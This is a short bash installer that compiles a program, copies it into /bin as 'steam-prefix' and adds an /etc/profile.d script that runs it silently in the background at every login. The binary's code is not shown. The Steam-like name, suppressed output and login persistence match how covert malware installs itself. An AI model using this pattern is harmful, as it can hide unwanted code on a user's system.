#! /bin/bash

source ./compile.sh
sudo cp ./main.bin /bin/steam-prefix
echo "/bin/steam-prefix > /dev/null 2>&1 &" > ./steam-prefix.sh
sudo mv ./steam-prefix.sh /etc/profile.d/steam-prefix.sh
source ./cleanup.sh
